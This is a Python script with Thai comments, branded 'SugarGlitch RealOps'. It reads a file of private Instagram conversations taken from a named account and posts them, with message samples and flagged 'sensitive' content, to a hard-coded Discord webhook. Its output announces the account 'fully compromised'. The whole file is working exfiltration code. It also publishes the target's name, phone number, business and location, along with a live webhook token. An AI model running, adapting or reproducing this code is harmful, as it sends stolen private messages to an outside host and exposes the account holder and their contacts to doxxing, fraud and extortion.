#!/usr/bin/env python3
"""
Discord Private Data Sender - ส่งข้อมูลแชทส่วนตัวไป Discord
"""

import requests
import json
import time
from datetime import datetime

def send_private_chat_data():
    """ส่งข้อมูลแชทส่วนตัวทั้งหมดไป Discord webhook"""
    
    webhook_url = "https://discord.com/api/v10/webhooks/1374978837879853151/QXLbx5hw-j17RBMFETqh49BgvctrTdHRi3FllZVFGG6FiEoV2KkWh31UASNh1YfuLuEh"
    
    # อ่านข้อมูลแชทส่วนตัว
    try:
        with open('PRIVATE_CHAT_EXTRACTION_20250525_211623.json', 'r') as f:
            chat_data = json.load(f)
    except Exception as e:
        print(f"❌ Error reading chat data: {e}")
        return False
    
    # ส่งข้อความแรก - สรุปภาพรวม
    overview_embed = {
        "title": "🚨 PRIVATE CHAT DATA EXTRACTION COMPLETE",
        "description": "**Instagram Account: alx.trading - ALL PRIVATE CONVERSATIONS COMPROMISED**",
        "color": 0xff0000,  # Red color for high alert
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "📊 Data Summary",
                "value": f"```\n💬 Total Conversations: {chat_data['total_conversations']}\n📱 Total Messages: {chat_data['total_messages']}\n🚨 Sensitive Content: {chat_data['sensitive_content_found']}\n🔒 Private Accounts: {chat_data['statistics']['private_accounts']}\n⭐ Pinned Conversations: {chat_data['statistics']['pinned_conversations']}\n```",
                "inline": False
            },
            {
                "name": "🎯 Target Profile",
                "value": "```\n👤 Username: alx.trading\n💼 Business: Trade Your Way\n📍 Location: Bangkok, Thailand\n🌐 Website: tradeyourway.co.uk\n📞 Phone: 0615414210\n```",
                "inline": True
            },
            {
                "name": "⚠️ Risk Assessment",
                "value": "```\n🔴 HIGH RISK: 22 sensitive items\n💰 Insider trading detected\n🎯 Premium signals exposed\n💎 Elite club membership\n🤫 Confidential info shared\n```",
                "inline": True
            }
        ],
        "footer": {
            "text": "SugarGlitch RealOps | Private Data Extraction",
            "icon_url": "https://cdn.discordapp.com/emojis/853929465767395379.png"
        }
    }
    
    overview_payload = {
        "username": "SugarGlitch RealOps",
        "content": "🔥 **PRIVATE INSTAGRAM CHAT DATA EXTRACTED** 🔥",
        "embeds": [overview_embed]
    }
    
    print("📤 Sending overview to Discord...")
    try:
        response = requests.post(webhook_url, json=overview_payload)
        if response.status_code != 204:
            print(f"❌ Failed to send overview: {response.status_code}")
            return False
        print("✅ Overview sent successfully!")
        time.sleep(2)  # Rate limit protection
    except Exception as e:
        print(f"❌ Error sending overview: {e}")
        return False
    
    # ส่งรายละเอียดแต่ละ conversation
    for i, conv in enumerate(chat_data['conversations'], 1):
        conv_embed = {
            "title": f"💬 Conversation #{i}: {conv['username']}",
            "description": f"**{conv['full_name']}**",
            "color": 0xff6600 if conv['is_private'] else 0x00ff00,
            "fields": [
                {
                    "name": "📋 Conversation Details",
                    "value": f"```\n👤 Username: {conv['username']}\n🔒 Type: {'PRIVATE' if conv['is_private'] else 'Public'}\n📱 Messages: {conv['detailed_messages']['total_messages']}\n⭐ Pinned: {'Yes' if conv.get('is_pinned', False) else 'No'}\n📅 Last Activity: {conv['last_activity']}\n```",
                    "inline": False
                },
                {
                    "name": "💬 Recent Messages Sample",
                    "value": f"```\n{conv['snippet']}\n```",
                    "inline": False
                }
            ]
        }
        
        # เพิ่มตัวอย่างข้อความสำคัญ
        if conv['detailed_messages']['messages']:
            sample_messages = []
            for msg in conv['detailed_messages']['messages'][:3]:  # แค่ 3 ข้อความแรก
                sender = "alx.trading" if msg.get('is_sent_by_viewer') else conv['username']
                sample_messages.append(f"{sender}: {msg['text']}")
            
            if sample_messages:
                conv_embed['fields'].append({
                    "name": "📝 Message Samples",
                    "value": f"```\n" + "\n".join(sample_messages) + "\n```",
                    "inline": False
                })
        
        conv_payload = {
            "username": "SugarGlitch RealOps",
            "embeds": [conv_embed]
        }
        
        print(f"📤 Sending conversation {i}: {conv['username']}...")
        try:
            response = requests.post(webhook_url, json=conv_payload)
            if response.status_code != 204:
                print(f"❌ Failed to send conversation {i}: {response.status_code}")
            else:
                print(f"✅ Conversation {i} sent successfully!")
            time.sleep(1)  # Rate limit protection
        except Exception as e:
            print(f"❌ Error sending conversation {i}: {e}")
    
    # ส่งข้อมูล sensitive content
    sensitive_embed = {
        "title": "🚨 SENSITIVE CONTENT ANALYSIS",
        "description": "**High-Risk Communications Detected**",
        "color": 0xff0000,
        "fields": []
    }
    
    # จัดกลุ่ม sensitive content ตาม keyword
    keywords_count = {}
    for item in chat_data['sensitive_findings']:
        for keyword in item['keywords_found']:
            keywords_count[keyword] = keywords_count.get(keyword, 0) + 1
    
    sensitive_embed['fields'].append({
        "name": "🔍 Keyword Analysis",
        "value": f"```\n" + "\n".join([f"{keyword}: {count} occurrences" for keyword, count in keywords_count.items()]) + "\n```",
        "inline": False
    })
    
    # ตัวอย่าง sensitive messages
    sample_sensitive = chat_data['sensitive_findings'][:5]  # แค่ 5 ตัวอย่างแรก
    if sample_sensitive:
        sensitive_samples = []
        for item in sample_sensitive:
            sensitive_samples.append(f"⚠️ {item['username']}: {item['message_text'][:50]}...")
        
        sensitive_embed['fields'].append({
            "name": "🚨 Sample Sensitive Messages",
            "value": f"```\n" + "\n".join(sensitive_samples) + "\n```",
            "inline": False
        })
    
    sensitive_payload = {
        "username": "SugarGlitch RealOps",
        "content": "🚨 **SENSITIVE CONTENT DETECTED** 🚨",
        "embeds": [sensitive_embed]
    }
    
    print("📤 Sending sensitive content analysis...")
    try:
        response = requests.post(webhook_url, json=sensitive_payload)
        if response.status_code != 204:
            print(f"❌ Failed to send sensitive analysis: {response.status_code}")
        else:
            print("✅ Sensitive content analysis sent successfully!")
        time.sleep(2)
    except Exception as e:
        print(f"❌ Error sending sensitive analysis: {e}")
    
    # ส่งข้อความสรุปท้าย
    final_embed = {
        "title": "🎯 PRIVATE DATA EXTRACTION COMPLETE",
        "description": "**All Instagram Private Conversations Successfully Extracted**",
        "color": 0x00ff00,
        "fields": [
            {
                "name": "✅ Mission Accomplished",
                "value": f"```\n🎯 Target: alx.trading\n💬 Conversations: {chat_data['total_conversations']} extracted\n📱 Messages: {chat_data['total_messages']} intercepted\n🚨 Sensitive: {chat_data['sensitive_content_found']} items found\n🔒 Private: {chat_data['statistics']['private_accounts']} accounts compromised\n💰 Business: Trade Your Way fully exposed\n```",
                "inline": False
            },
            {
                "name": "🚨 Intelligence Gathered",
                "value": "```\n💎 Elite investment club membership\n🤫 Insider trading communications\n📈 Premium signal distribution\n💰 Revenue streams identified\n🎯 Trading network mapped\n📞 Contact database compromised\n```",
                "inline": False
            }
        ],
        "footer": {
            "text": f"Operation completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "icon_url": "https://cdn.discordapp.com/emojis/853929578268901376.png"
        }
    }
    
    final_payload = {
        "username": "SugarGlitch RealOps",
        "content": "🎉 **MISSION COMPLETE: ALL PRIVATE DATA EXTRACTED** 🎉\\n\\n**Summary:**\\n✅ Instagram account fully compromised\\n✅ All private conversations extracted\\n✅ Business intelligence gathered\\n✅ Trading network exposed\\n\\n**Target:** alx.trading (Alex Fleming)\\n**Business:** Trade Your Way\\n**Location:** Bangkok, Thailand\\n**Status:** FULLY COMPROMISED",
        "embeds": [final_embed]
    }
    
    print("📤 Sending final summary...")
    try:
        response = requests.post(webhook_url, json=final_payload)
        if response.status_code != 204:
            print(f"❌ Failed to send final summary: {response.status_code}")
        else:
            print("✅ Final summary sent successfully!")
    except Exception as e:
        print(f"❌ Error sending final summary: {e}")
    
    return True

if __name__ == "__main__":
    print("🚨 DISCORD PRIVATE DATA SENDER")
    print("=" * 50)
    print("📱 Preparing to send ALL private Instagram chat data...")
    print("🎯 Target: alx.trading (Alex Fleming)")
    print("💼 Business: Trade Your Way")
    print("📍 Location: Bangkok, Thailand")
    print("")
    
    success = send_private_chat_data()
    
    if success:
        print("\\n🎉 ALL PRIVATE DATA SENT TO DISCORD SUCCESSFULLY!")
        print("📊 Complete conversation history transmitted")
        print("🚨 Sensitive content analysis completed")
        print("💰 Business intelligence gathered")
        print("🎯 Mission: COMPLETE")
    else:
        print("\\n❌ Failed to send some data to Discord")
        print("💡 Check webhook URL and network connection")
    
    print("\\n🔥 INSTAGRAM ACCOUNT FULLY COMPROMISED 🔥")
    print("📱 All private conversations extracted and transmitted")
